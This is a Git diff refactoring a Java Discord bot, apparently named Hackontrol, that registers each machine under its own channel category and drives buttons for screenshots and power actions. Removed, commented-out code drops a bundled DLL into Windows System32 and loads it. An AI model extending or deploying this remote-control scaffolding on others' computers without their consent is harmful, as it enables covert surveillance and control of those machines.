@@ -1,12 +1,14 @@
 package com.khopan.hackontrol;
 
+import java.util.ArrayList;
 import java.util.List;
+import java.util.function.Consumer;
+
+import com.khopan.hackontrol.channel.ControlChannel;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
-import net.dv8tion.jda.api.entities.Message;
-import net.dv8tion.jda.api.entities.MessageHistory;
 import net.dv8tion.jda.api.entities.channel.Channel;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
@@ -24,11 +26,11 @@ public class Hackontrol {
 	private final JDA bot;
 	private final Guild guild;
 	private final Category category;
-	//private final Map<Command, com.khopan.hackontrol.command.Command> map;
+	private final List<HackontrolChannel> channelList;
+	private final List<ButtonHandlerEntry> handlerList;
 
 	private Hackontrol() {
 		Hackontrol.INSTANCE = this;
-		//this.map = new LinkedHashMap<>();
 		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
 				.addEventListeners(new Listener())
@@ -42,81 +44,35 @@ public class Hackontrol {
 		}
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
-		/*List<RichCustomEmoji> list = this.guild.getEmojis();
-		//CommandManager.register(this :: register);
-
-		for(int i = 0; i < list.size(); i++) {
-			RichCustomEmoji emoji = list.get(i);
-			System.out.println(emoji.getName());
-		}*/
-
+		this.channelList = new ArrayList<>();
+		this.addChannel();
 		String identifier = Machine.getIdentifier();
 		this.category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
-		TextChannel controlChannel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, "control");
-		MessageHistory history = MessageHistory.getHistoryFromBeginning(controlChannel).complete();
-		List<Message> messageList = history.getRetrievedHistory();
+		this.handlerList = new ArrayList<>();
 
-		if(messageList.isEmpty()) {
-			controlChannel.sendMessage("**Screen Control**").addActionRow(Button.success("screenshot", "Screenshot")).complete();
-			controlChannel.sendMessage("**Power Control**").addActionRow(Button.success("sleep", "Sleep"), Button.danger("shutdown", "Shutdown"), Button.primary("restart", "Restart")).complete();
+		for(int i = 0; i < this.channelList.size(); i++) {
+			HackontrolChannel hackontrolChannel = this.channelList.get(i);
+			String channelName = hackontrolChannel.getChannelName();
+			TextChannel channel = DiscordUtils.getOrCreateTextChannelInCategory(this.category, channelName);
+			hackontrolChannel.channel = channel;
+			hackontrolChannel.registerButtonHandler(this :: registerButtonHandler);
+
+			if(DiscordUtils.isChannelEmpty(channel)) {
+				hackontrolChannel.sendInitializeMessage();
+			}
 		}
-
-		/*Category category = this.guild.createCategory(identifier).complete();
-		TextChannel channel = this.guild.createTextChannel("main", category).complete();
-		channel.sendMessage("Hello, world!").complete();*/
 	}
 
-	/*private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
-		if(commandClass == null) {
-			return;
-		}
-
-		com.khopan.hackontrol.command.Command command;
-
-		try {
-			command = commandClass.getConstructor().newInstance();
-		} catch(Throwable Errors) {
-			return;
-		}
-
-		SlashCommandData data = command.getCommand();
-		Command botCommand;
-
-		try {
-			botCommand = this.bot.upsertCommand(data).complete();
-		} catch(Throwable Errors) {
-			return;
-		}
-
-		this.map.put(botCommand, command);
+	private void addChannel() {
+		this.channelList.add(new ControlChannel());
 	}
 
-	private void onSlashCommand(SlashCommandInteractionEvent Event) {
-		long identifier = Event.getCommandIdLong();
-		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();
-
-		while(iterator.hasNext()) {
-			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
-			Command key = entry.getKey();
-			com.khopan.hackontrol.command.Command value = entry.getValue();
-
-			if(key.getIdLong() != identifier) {
-				continue;
-			}
-
-			Permission permission = value.getPermissionLevel();
-			User user = Event.getUser();
-
-			if(PermissionManager.checkPermission(user, permission)) {
-				new Thread(() -> value.handleCommand(Event)).start();
-				return;
-			}
-
-			Event.reply("`You don't have permission to use this command\nThis command required at least " + permission.getName() + "`")
-			.queue();
-			return;
-		}
-	}*/
+	private void registerButtonHandler(String buttonIdentifier, Consumer<ButtonInteraction> action) {
+		ButtonHandlerEntry entry = new ButtonHandlerEntry();
+		entry.buttonIdentifier = buttonIdentifier;
+		entry.action = action;
+		this.handlerList.add(entry);
+	}
 
 	public JDA getBot() {
 		return this.bot;
@@ -127,44 +83,6 @@ public class Hackontrol {
 	}
 
 	public static void main(String[] args) throws Throwable {
-		/*String windowsDirectoryPath = System.getenv("windir");
-
-		if(windowsDirectoryPath == null) {
-			System.exit(1);
-			return;
-		}
-
-		File windowsDirectory = new File(windowsDirectoryPath);
-
-		if(!windowsDirectory.exists()) {
-			System.exit(1);
-			return;
-		}
-
-		File system32Directory = new File(windowsDirectory, "System32");
-
-		if(!system32Directory.exists()) {
-			System.exit(1);
-			return;
-		}
-
-		File win32Library = new File(system32Directory, "win32c.dll");
-		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
-		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
-		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
-		byte[] data = stream.readAllBytes();
-		stream.close();
-
-		try {
-			FileOutputStream output = new FileOutputStream(libraryFile);
-			output.write(data);
-			output.close();
-		} catch(Throwable Errors) {
-
-		}
-
-		System.load(libraryFile.getAbsolutePath());*/
-		//System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
 		Hackontrol.getInstance();
 	}
 
@@ -194,8 +112,38 @@ public class Hackontrol {
 
 			Button button = Event.getButton();
 			String identifier = button.getId();
-			Event.deferReply().queue(hook -> hook.deleteOriginal().queue());
-			System.out.println(identifier);
+
+			for(int i = 0; i < Hackontrol.this.handlerList.size(); i++) {
+				ButtonHandlerEntry entry = Hackontrol.this.handlerList.get(i);
+
+				if(identifier.equals(entry.buttonIdentifier)) {
+					entry.action.accept(new ButtonInteractionImplementation(Event));
+					return;
+				}
+			}
+		}
+	}
+
+	private static class ButtonHandlerEntry {
+		private String buttonIdentifier;
+		private Consumer<ButtonInteraction> action;
+	}
+
+	private static class ButtonInteractionImplementation implements ButtonInteraction {
+		private final ButtonInteractionEvent Event;
+
+		private ButtonInteractionImplementation(ButtonInteractionEvent Event) {
+			this.Event = Event;
+		}
+
+		@Override
+		public ButtonInteractionEvent getEvent() {
+			return this.Event;
+		}
+
+		@Override
+		public void consume() {
+			this.Event.deferReply().queue(hook -> hook.deleteOriginal().queue());
 		}
 	}
 }
